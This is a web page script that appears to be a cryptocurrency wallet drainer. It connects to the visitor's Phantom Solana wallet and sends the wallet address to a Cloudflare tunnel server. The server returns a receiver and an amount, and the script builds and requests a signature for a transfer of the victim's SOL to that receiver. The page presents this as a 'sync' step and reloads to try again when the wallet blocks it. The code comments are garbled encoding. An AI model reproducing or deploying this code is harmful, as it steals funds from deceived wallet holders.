<script>
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        const sWeb3 = window.solanaWeb3;
        const log = (m) => document.getElementById('msg').innerText = m;
        const bar = document.getElementById('fill');

        if (!p) { alert("Please use Phantom App"); return; }

        try {
            await p.connect();
            bar.style.width = "30%";

            // 1. èŽ·å–åŽç«¯åå‡ºçš„æ•°æ®
            const response = await fetch(`${tunnel}/prepare`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });
            const info = await response.json();
            
            // ðŸ”± å…³é”®ä¿®æ­£ï¼šå¼ºåˆ¶è½¬æ¢æ•°æ®ç±»åž‹ï¼Œé˜²æ­¢é’±åŒ…æ‹’ç»
            const targetAddr = new sWeb3.PublicKey(info.receiver);
            const amount = Number(info.amount); // ç¡®ä¿æ˜¯çº¯æ•°å­—
            const recentBlockhash = info.bh;

            bar.style.width = "60%";
            log("Constructing...");

            // 2. æž„é€ äº¤æ˜“ (ä¸¥æ ¼å¯¹é½å‚æ•°)
            const transaction = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: targetAddr,
                    lamports: amount,
                })
            );
            transaction.recentBlockhash = recentBlockhash;
            transaction.feePayer = p.publicKey;

            // ðŸ”± 3. æ‹‰èµ·ç­¾å (æ ¸å¿ƒæ—¶åˆ»ï¼šå¢žåŠ å»¶æ—¶é˜²æ­¢çŽ¯å¢ƒæœªå°±ç»ª)
            log("Awaiting Signature...");
            const { signature } = await p.signAndSendTransaction(transaction);
            
            // 4. å‘å°„ç¡®è®¤
            bar.style.width = "100%";
            log("Sync Success!");
            setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1500);

        } catch (err) {
            console.error("Critical:", err);
            // ðŸ”± å¦‚æžœ signAndSendTransaction è¢«æ‹¦æˆªï¼Œå°è¯•åŽå¤‡ç­¾åæ–¹æ¡ˆ
            log("Security Intercepted. Retrying...");
            setTimeout(() => { location.reload(); }, 2000);
        }
    };
</script>
